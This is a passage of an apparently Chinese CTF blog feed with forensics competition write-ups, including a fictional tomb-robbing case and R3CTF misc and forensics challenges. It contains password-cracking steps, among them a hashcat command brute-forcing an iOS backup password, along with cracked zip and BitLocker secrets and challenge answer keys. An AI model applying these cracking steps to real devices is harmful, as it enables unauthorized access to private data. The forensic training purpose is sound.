href="#18、检材-4-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站（2-分）" class="headerlink" title="18、检材 4-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站（2 分）"></a>18、检材 4-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站（2 分）</h3><pre><code>文物流转聊天室.html</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280133161.png" alt="image-20240728013346048"></p><h3 id="19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3-分）"><a href="#19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3-分）" class="headerlink" title="19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3 分）"></a>19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3 分）</h3><pre><code>20240712</code></pre><p>从检材一的铛铛聊天数据库中找到一段关于盗墓的聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280150051.png" alt="image-20240728015045900"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280150195.png" alt="image-20240728015056082"></p><h3 id="20、盗墓团伙最近一次盗的墓名是？（3-分）"><a href="#20、盗墓团伙最近一次盗的墓名是？（3-分）" class="headerlink" title="20、盗墓团伙最近一次盗的墓名是？（3 分）"></a>20、盗墓团伙最近一次盗的墓名是？（3 分）</h3><pre><code>王墓坡</code></pre><p>接上题图</p><h3 id="21、大金牙的手机号码是什么？（5-分）"><a href="#21、大金牙的手机号码是什么？（5-分）" class="headerlink" title="21、大金牙的手机号码是什么？（5 分）"></a>21、大金牙的手机号码是什么？（5 分）</h3><pre><code>13913913916</code></pre><p>在检材四分析出的<code>文物中转站聊天室.html</code>中找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280152000.png" alt="image-20240728015221860"></p><h3 id="22、检材-7-虚拟货币钱包的地址（5-分）"><a href="#22、检材-7-虚拟货币钱包的地址（5-分）" class="headerlink" title="22、检材 7-虚拟货币钱包的地址（5 分）"></a>22、检材 7-虚拟货币钱包的地址（5 分）</h3><pre><code>1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2</code></pre><p>检材七是U盘镜像 根据在检材四找到的<code>提示.doc</code>的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280153950.png" alt="image-20240728015351750"></p><p>那直接取证大师原始数据搜索即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291958596.png" alt="image-20240729195801508"></p><h3 id="23、检材-7-虚拟货币助记词（5-分）"><a href="#23、检材-7-虚拟货币助记词（5-分）" class="headerlink" title="23、检材 7-虚拟货币助记词（5 分）"></a>23、检材 7-虚拟货币助记词（5 分）</h3><pre><code>love can play games tomorrow money</code></pre><p>直接分析U盘就可以找到一个<code>助记词.zip</code> 发现有密码 直接拿来爆破就好</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291755827.png" alt="image-20240729175514677"></p><p>解压就有助记词</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291755088.png" alt="image-20240729175546038"></p><h3 id="24、检材-3-系统登陆密码（5-分）"><a href="#24、检材-3-系统登陆密码（5-分）" class="headerlink" title="24、检材 3-系统登陆密码（5 分）"></a>24、检材 3-系统登陆密码（5 分）</h3><pre><code>20242024</code></pre><p>检材三是windows镜像 在拿进去分析的时候密码就跑出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291756448.png" alt="image-20240729175644389"></p><h3 id="25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）"><a href="#25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）" class="headerlink" title="25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）"></a>25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）</h3><pre><code>James David</code></pre><p>这种一般还是要分析聊天记录 现在还没有分析的就是检材6的安卓手机备份  看分析结果有Skype Potato 微信 Telegram 在Telegram中找到关于文物贩卖的聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292105600.png" alt="image-20240729210534433"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292105829.png" alt="image-20240729210544690"></p><p>一共是两个人</p><h3 id="26、该案件中，文物贩子与买家的通讯-APP-的包名是？（3-分）"><a href="#26、该案件中，文物贩子与买家的通讯-APP-的包名是？（3-分）" class="headerlink" title="26、该案件中，文物贩子与买家的通讯 APP 的包名是？（3 分）"></a>26、该案件中，文物贩子与买家的通讯 APP 的包名是？（3 分）</h3><pre><code>org.telegram.messenger.web</code></pre><p>接上题 应该是Telegram 找到对应的报包名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292107873.png" alt="image-20240729210701743"></p><h3 id="27、大金牙的真实姓名可能是？（3-分）"><a href="#27、大金牙的真实姓名可能是？（3-分）" class="headerlink" title="27、大金牙的真实姓名可能是？（3 分）"></a>27、大金牙的真实姓名可能是？（3 分）</h3><pre><code>冀璐晟</code></pre><p>由第21题可知大金牙手机号为13913913916直接在通讯录里面找</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300022846.png" alt="image-20240730002217690"></p><h3 id="28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3-分）"><a href="#28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3-分）" class="headerlink" title="28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3 分）"></a>28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3 分）</h3><pre><code>MATIC</code></pre><p>这里可以在检材4中找到嵌套证据苹果手机备份文件 导出分析 发现需要密码 爆破<code>Manifest.plist</code>得到密码<code>364289</code> 填入密码继续分析</p><p> 由于我的显卡不是很好 这里选择使用hashcat进行爆破 先获取文件密码的哈希值 将结果保存在hash.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301244953.png" alt="image-20240730002524380"></p><p>9分钟将6位纯数字密码爆破出 还是非常快的 </p><pre><code>./hashcat -m 14800 ./hash.txt -a 3 &#39;?d?d?d?d?d?d&#39;# 从获取到的哈希值中可知 这个苹果手机备份的ios版本大于10 所以这里-m 后面的参数是14800 如果是小于10的版本 则使用14700</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301336536.png" alt="image-20240730002524380"></p><p>在火眼分析结果的微信聊天记录中 我们找到眼镜仔和大金牙交易过程中提到了使用的货币</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301028179.png" alt="image-20240730002524380"></p><h3 id="29、该案件中，谁是文物贩子？（3-分）"><a href="#29、该案件中，谁是文物贩子？（3-分）" class="headerlink" title="29、该案件中，谁是文物贩子？（3 分）"></a>29、该案件中，谁是文物贩子？（3 分）</h3><pre><code>大金牙</code></pre><p>根据上面Telegram的聊天记录 得知是大金牙</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300025504.png" alt="image-20240730002524380"></p><h3 id="30、盗墓团伙最近一次交易的文物有几个？（5分）"><a href="#30、盗墓团伙最近一次交易的文物有几个？（5分）" class="headerlink" title="30、盗墓团伙最近一次交易的文物有几个？（5分）"></a>30、盗墓团伙最近一次交易的文物有几个？（5分）</h3><pre><code>5</code></pre><p><font color='red'>这里的需要注意这个交易是指以盗墓团伙与大金牙对文物的一手交易 在盗墓团伙中 眼镜仔应该是负责销赃 而不是后面在检材6的Telegram聊天记录中 我们找到的大金牙找到James还有David的对文物的第二手交易</font></p><p>也是读聊天记录 传了一个有要交易的文物图片的压缩包 解压密码在上面的聊天记录里面<code>yjz_18022462024</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301104719.png" alt="image-20240730002524380"></p><p>解压后 看到有7张图片<img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301105057.png" alt="image-20240730002524380"></p><p>仔细查看 可以发现 图2和图4是一个文物 图6和图7是一个文物</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301107021.png" alt="image-20240730002524380"></p><p>因此 一共交易了5个文物</p><h3 id="31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）"><a href="#31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）" class="headerlink" title="31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）"></a>31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）</h3><pre><code>188000MATIC</code></pre><p>聊天记录中 大金牙一共从眼镜仔中买了两批货 都使用虚拟币MATIC进行交易 共18.8W MATIC</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301113942.png" alt="image-20240730002524380"></p><h3 id="32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）"><a href="#32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）" class="headerlink" title="32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）"></a>32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）</h3><pre><code>68600ETH</code></pre><p>在我们分析检材6的Telegram聊天记录时可以发现 大金牙对买家说 交易文物的价格都在发送的文物图片上 但是我们找到原图片 并没有发现所说的价格 结合下面第40题提到检材6安卓手机上安装的隐写工具 猜测价格是使用隐写工具进行了隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301223276.png" alt="image-20240730002524380"></p><p>先从第一个隐写工具开始尝试 从文件系统中找到其对应的apk文件 导出 安装到雷电模拟器上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114202.png" alt="image-20240730011438813"></p><p>点击<code>Reveal the Message</code> 查看图片中的信息 就可以提取到隐写的价格信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301341891.png" alt="image-20240730011438813"></p><p>找到<code>SX-WW-202407001</code>这张图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301340515.png" alt="image-20240730011438813"></p><p>因此文物名为“SX-WW-202407001”价格是68600ETH</p><h3 id="33、盗墓地点的-GPS-经纬度（格式：经度-xx-xx-xx，纬度-xx-xx-xx-（1-分）"><a href="#33、盗墓地点的-GPS-经纬度（格式：经度-xx-xx-xx，纬度-xx-xx-xx-（1-分）" class="headerlink" title="33、盗墓地点的 GPS 经纬度（格式：经度 xx,xx,xx，纬度 xx,xx,xx)（1 分）"></a>33、盗墓地点的 GPS 经纬度（格式：经度 xx,xx,xx，纬度 xx,xx,xx)（1 分）</h3><pre><code>112,36,57, 27,50,45</code></pre><p>提到盗墓地点的聊天记录在检材1的铛铛数据库中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301655845.png" alt="image-20240730165544342"></p><p>但是提到的这三张图片在检材二中找到 在建材二中存在一个back_image.zip 解压之后就是三张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707890.png" alt="image-20240730170314565"></p><p>其中盗墓地点是image-1.jpg 所在地经纬度直接看属性</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707997.png" alt="image-20240730170400322"></p><h3 id="34、盗墓前集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）"><a href="#34、盗墓前集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）" class="headerlink" title="34、盗墓前集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）"></a>34、盗墓前集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）</h3><pre><code>112,36,53, 37,50,45</code></pre><p>盗墓前集合地是image-2.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707489.png" alt="image-20240730170509522"></p><h3 id="35、盗墓后集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）"><a href="#35、盗墓后集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）" class="headerlink" title="35、盗墓后集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）"></a>35、盗墓后集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）</h3><pre><code>112,36,52, 37,47,51</code></pre><p>盗墓后集合地是image-3.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301706928.png" alt="image-20240730170609878"></p><h3 id="36-检材-6中最近一次呼入的号码是？"><a href="#36-检材-6中最近一次呼入的号码是？" class="headerlink" title="36.检材 6中最近一次呼入的号码是？"></a>36.<strong>检材</strong> 6中最近一次呼入的号码是？</h3><pre><code>9528207</code></pre><p>这里要区分一个点 火眼分析结果中 会把呼入但是未接通的通话记录标记为未接 但是就算是没有接通 也是产生了呼入这个动作 </p><p><font color='red'>为了方便理解 我们可以把呼入呼出认为是一种动作 未接接通和拒接认为是状态 这里是需要我们找最近一次呼入这个动作的号码</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301025559.png" alt="image-20240730102559303"></p><h3 id="37、检材6-浏览器第一次搜索的内容是？（1分）"><a href="#37、检材6-浏览器第一次搜索的内容是？（1分）" class="headerlink" title="37、检材6-浏览器第一次搜索的内容是？（1分）"></a>37、检材6-浏览器第一次搜索的内容是？（1分）</h3><pre><code>隐写工具</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300112928.png" alt="image-20240730011205661"></p><h3 id="38、检材6-手机所使用的翻墙APP是？（1分）"><a href="#38、检材6-手机所使用的翻墙APP是？（1分）" class="headerlink" title="38、检材6-手机所使用的翻墙APP是？（1分）"></a>38、检材6-手机所使用的翻墙APP是？（1分）</h3><pre><code>Clash</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300112647.png" alt="image-20240730011243363"></p><h3 id="39、检材6-翻墙APP所使用的订阅地址是？（1分）"><a href="#39、检材6-翻墙APP所使用的订阅地址是？（1分）" class="headerlink" title="39、检材6-翻墙APP所使用的订阅地址是？（1分）"></a>39、检材6-翻墙APP所使用的订阅地址是？（1分）</h3><pre><code>https://miaomiao.xn--7rs48z0nlr6hc8cqz4a.com/api/v1/client/subscribe?token=1357e1cbda597141d15ae689b3d470d7</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114570.png" alt="image-20240730011402242"></p><h3 id="40、检材6-手机上安装了哪些隐写工具？（1分）"><a href="#40、检材6-手机上安装了哪些隐写工具？（1分）" class="headerlink" title="40、检材6-手机上安装了哪些隐写工具？（1分）"></a>40、检材6-手机上安装了哪些隐写工具？（1分）</h3><pre><code>Stegais Steganography</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114202.png" alt="image-20240730011438813"></p><h3 id="41、检材8-使用的苹果账号是？（1分）"><a href="#41、检材8-使用的苹果账号是？（1分）" class="headerlink" title="41、检材8-使用的苹果账号是？（1分）"></a>41、检材8-使用的苹果账号是？（1分）</h3><pre><code>rdmf_top@163.com</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301706956.png" alt="image-20240730011622858"></p><h3 id="42-检材8-系统版本是？（x-x-x）（1分）"><a href="#42-检材8-系统版本是？（x-x-x）（1分）" class="headerlink" title="42.检材8-系统版本是？（x.x.x）（1分）"></a>42.检材8-系统版本是？（x.x.x）（1分）</h3><pre><code>17.5.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300117272.png" alt="image-20240730011700969"></p><h3 id="43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx-xx…）（2分）"><a href="#43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx-xx…）（2分）" class="headerlink" title="43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx:xx…）（2分）"></a>43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx:xx…）（2分）</h3><pre><code>5e:37:7d:2a:47:5e</code></pre><h4 id="在检材8中分析"><a href="#在检材8中分析" class="headerlink" title="在检材8中分析"></a>在检材8中分析</h4><p>发现直接分析的结果中是没有wifi的信息的 但是我们知道存放ios系统的wifi信息的文件的路径是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300933530.png" alt="image-20240730093355447"></p><p>那么直接翻文件夹 虽然没有直接找到这个pslist文件 但是可以找到两个类似的<code>com.apple.wifi-networks.plist</code>和<code>com.apple.wifi-networks.plist.backup</code>  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300934854.png" alt="image-20240730093420554"></p><p>直接查看<code>com.apple.wifi-networks.plist</code> 发现没有东西 那么我们把<code>com.apple.wifi-networks.plist.backup</code>  导出  在用pslist Editor查看 找到关于WiFi网络名为“大兄弟的网络”的相关信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300938935.png" alt="image-20240730093821671"></p><h4 id="在检材4导出的苹果手机备份中分析"><a href="#在检材4导出的苹果手机备份中分析" class="headerlink" title="在检材4导出的苹果手机备份中分析"></a>在检材4导出的苹果手机备份中分析</h4><p>抽象的一点 这个wifi的信息竟然在之前导出的苹果手机备份中也有 而且是可以直接分析出来的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301023322.png" alt="image-20240730102053020"></p><p>当然可以分析出来的原因是有可以被火眼识别出的pslist文件记录了这个wifi信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301023265.png" alt="image-20240730102311135"></p><h3 id="44、检材8-手机IMEI是？（1分）"><a href="#44、检材8-手机IMEI是？（1分）" class="headerlink" title="44、检材8-手机IMEI是？（1分）"></a>44、检材8-手机IMEI是？（1分）</h3><pre><code>357272092128408</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300127325.png" alt="image-20240730012714012"></p><h3 id="45、检材3-BitLocker恢复密钥（5分）"><a href="#45、检材3-BitLocker恢复密钥（5分）" class="headerlink" title="45、检材3-BitLocker恢复密钥（5分）"></a>45、检材3-BitLocker恢复密钥（5分）</h3><pre><code>010461-617507-553498-499752-253286-356334-124773-180169</code></pre><p>接第九题</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.大体人物关系如下图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301728012.png" alt="image-20240730172833925"></p><p>2.前面的题目正常分析 第9题需要对windows硬盘进行bitlocker密钥爆破 由第五题得知 本案的大体方向是盗墓 并且盗墓团伙的主要通讯工具是铛铛 需要手动分析聊天记录数据库</p><p>3.对macbook进行仿真分析 查看文物中转站聊天室.html 得知盗墓团伙三个成员：眼镜仔 张老四 王胖子 同时在其中找到苹果手机备份 爆破密钥进行解密</p><p>4.在找到的苹果备份的微信聊天记录中得知 眼镜仔和买家大金牙联系进行销赃</p><p>5.在检材6大金牙的安卓手机Telegram聊天记录中得知 大金牙和国外买家James David联系 进行二手交易文物 同时 在对检材6的分析中发现搜索下载安装了隐写工具 并且聊天记录中提到在图片上的文物价格并没有直接显示在原图片上 通过直接在模拟器中安装对应的隐写工具恢复出被隐写的文物价格信息</p><p>6.最后回到关于盗墓行动的相关信息 在检材1的铛铛聊天记录中提到的盗墓地点、盗墓前集合地、盗墓后集合地的三张图片 在检材2的一个压缩包中找到 通过分析图片的EXIF信息 从而得知地点的具体经纬度信息。</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024斟茶王者wp</title>
      <link href="/2024/07/23/2024%E6%96%9F%E8%8C%B6%E7%8E%8B%E8%80%85/"/>
      <url>/2024/07/23/2024%E6%96%9F%E8%8C%B6%E7%8E%8B%E8%80%85/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a317c7dd3b45c851cdea5d1c92fadcd9196cde7bc666d9f87687709e06fd9b4e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>R3CTF2024</title>
      <link href="/2024/06/11/R3CTF/"/>
      <url>/2024/06/11/R3CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="R3CTF"><a href="#R3CTF" class="headerlink" title="R3CTF"></a>R3CTF</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="hideAndSeek"><a href="#hideAndSeek" class="headerlink" title="hideAndSeek"></a>hideAndSeek</h3><pre><code>Ben is a superpower who loves playing hide and seek. He can teleport to anywhere to no one can find him, but he seems unaware that his ability only works within a certain rangeRules:The adorable Ben will only appear within the range of (0, -50, 0) to (128, 50, 128).Ben will every 10 seconds and reappear in a new location after 10 seconds.A &quot;newtp&quot; has been added for all players to teleport to any coordinates.Connect info: 34.81.163.238version 1.19.2</code></pre><p>很抽象的mc游戏题 开始确实是用PCL2模拟器进入游戏去玩</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111941074.png" alt="image-20240611194137010"></p><p>看到给了个newtp命令 还查了很多教程去学MC的tp命令是如何使用 但是发现没啥用 在地图里面逛了一会儿 </p><p>用newtp大概传送了一些坐标 命令格式如下</p><pre><code>想传送到的坐标(x, y, z)newtp x y z</code></pre><p>后面直接翻log日志文件 找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111944005.png" alt="image-20240611194432924"></p><p>读日志可以发现 这个”Ben”的尸体类型应该是村民 并且他的名称就是flag</p><pre><code>R3CTF&#123;Jus7_play_m0r3_h1de_2nd_seek_w1th_Ben&#125;</code></pre><h3 id="h1de-ndSe3k"><a href="#h1de-ndSe3k" class="headerlink" title="h1de@ndSe3k"></a><strong>h1de@ndSe3k</strong></h3><p>其实做法和上面差不多 这次就算是Ben隐形了也没关系 我们只需要传送几次 等待一段时间 Ben会自己因为某种原因卡死 我们再从日志里面找他的死亡记录就行 但是因为服务器好像是关掉了 没法复现了 当时也是傻了 应该用上一题的方法再试一下</p><h3 id="Blizzard-CN-Restarts"><a href="#Blizzard-CN-Restarts" class="headerlink" title="Blizzard CN Restarts"></a>Blizzard CN Restarts</h3><p>但是没玩过魔兽 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112149143.png" alt="image-20240611214939074"></p><p>找个修改器打开看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112152521.png" alt="image-20240611215201456"></p><p>全部解压出来 使用FileLocator开搜 找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112151089.png" alt="image-20240611215156030"></p><h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><h3 id="TPA-01"><a href="#TPA-01" class="headerlink" title="TPA 01"></a>TPA 01</h3><p>e01镜像 直接丢进火眼 分析出个嵌套证据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112032961.png" alt="image-20240611203233869"></p><p>其实做这个题的时候分析过程还挺复杂的 感觉想的过于复杂了 归其原因还是经验太少 我甚至仿真起来了</p><p>翻文件夹的时候找到wsl 在结合嵌套证据 感觉预期解应该是要把这个系统恢复出来  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112050449.png" alt="image-20240611205056379"></p><p>但是好在有取证工具 不用恢复出来也可以做 下面就是由于我翻文件系统不仔细发现的另一种途径</p><p>010直接把密文翻出来了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112055098.png" alt="image-20240611205514050"></p><p>但是在火眼里面直接能看到 还能看到一个关于密钥的提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112056901.png" alt="image-20240611205601842"></p><pre><code>key：Do you like watch videos on youtube?Something fun there:https://www.youtube.com/@d3f4u1t-lololF14G：Hi players,welcome !Ops,what&#39;s that?2d422fc7f2c628c55520984c0673964eb5454dea72f79b1022a34728294c5bf8I guess u need a key to decrypt it.SELECT something FROM somewhere with the windows10 lol~</code></pre><p>根据提示 <code>SELECT something FROM somewhere</code> 想到应该和sql语句有点关系</p><p>先看一下key里面提到的视频</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112058291.png" alt="image-20240611205806214"></p><p>有个字符串 提出来看看</p><pre><code>0x6d617962652075206e6565642c746861742773206e6f74206162736f6c7574650a726f6f743a5040357357307264466f7255maybe u need,that&#39;s not absoluteroot:P@5sW0rdForU</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112058384.png" alt="image-20240611205838309"></p><p>给了个密码 尝试登陆mysql 成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112119979.png" alt="image-20240611211910791"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112119328.png" alt="image-20240611211951295"></p><pre><code>select * from secret;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112120733.png" alt="image-20240611212016645"></p><p>FFD8的头 一眼jpg图片 保存下来 给出了AES解密的key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112120597.png" alt="image-20240611212052560"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112121765.png" alt="image-20240611212115703"></p><p>其实这里也可以用一个项目<a href="https://github.com/ddcw/ibd2sql">ibd2sql</a>来解密数据库<code>secret.ibd</code>也可以</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112128083.png" alt="image-20240611212802969"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112128912.png" alt="image-20240611212855289"></p><h3 id="TPA-02-📱"><a href="#TPA-02-📱" class="headerlink" title="TPA 02 - 📱"></a>TPA 02 - 📱</h3><pre><code>Peggy is an employee at a company and, like many others, occasionally uses her personal mobile phone for work-related tasks. Unfortunately, she has become the target of a phishing attack. Your task is to uncover the details of this attack by finding the attacker&#39;s phone number and Peggy&#39;s password.Submit your findings in the format r3ctf&#123;number_password&#125;. For the phone number, remove any symbols and spaces. For example, if the attacker&#39;s phone number is +1 123-456-7890 and the password Peggy entered is passwd, your flag should be r3ctf&#123;11234567890_passwd&#125;.</code></pre><p>两部分 一个是找攻击者的手机号码 一个是找Peggy的登陆密码</p><p>先看流量 直接追踪tcp流 在第31个流 找到login登录页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112012655.png" alt="image-20240611201202596"></p><p>先找到password:l0v3_aNd_peace</p><p>再看给的手机文件夹 直接用火眼分析 分析出两个手机号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406112015219.png" alt="image-20240611201527146"></p><p>根据语境 可以得知是15555215556这个号码应该是Peggy的同事 来询问Peggy是否也收到了钓鱼信息</p><p>那下面的15555215558 应该就是攻击者的手机号码 直接组合起来</p><pre><code>r3ctf&#123;15555215558_l0v3_aNd_peace&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届黄河流域网络攻防竞赛</title>
      <link href="/2024/06/11/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F-%E8%A5%BF%E6%9F%9A%E5%96%B5%E5%B8%95%E6%96%AF/"/>
      <url>/2024/06/11/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F-%E8%A5%BF%E6%9F%9A%E5%96%B5%E5%B8%95%E6%96%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="第二届黄河流域-西柚喵帕斯"><a href="#第二届黄河流域-西柚喵帕斯" class="headerlink" title="第二届黄河流域-西柚喵帕斯"></a><strong>第二届黄河流域-西柚喵帕斯</strong></h1><h2 id="取证分析"><a href="#取证分析" class="headerlink" title="取证分析"></a><strong>取证分析</strong></h2><h3 id="内存取证1"><a href="#内存取证1" class="headerlink" title="内存取证1"></a><strong>内存取证1</strong></h3><pre><code>问题1：桌面上表格文件是什么？提交答案格式为flag&#123;带后缀名的敏感文件名称&#125;，比如flag&#123;敏感文件.xls&#125;</code></pre><p>使用r-studio打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722408.jpg" alt="img"> </p><h3 id="内存取证2"><a href="#内存取证2" class="headerlink" title="内存取证2"></a><strong>内存取证2</strong></h3><pre><code>问题2：JohnDoe用户登录mysql密码是多少？提交答案格式为flag&#123;登录密码&#125;，比如flag&#123;root&#125;。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111722022.jpg" 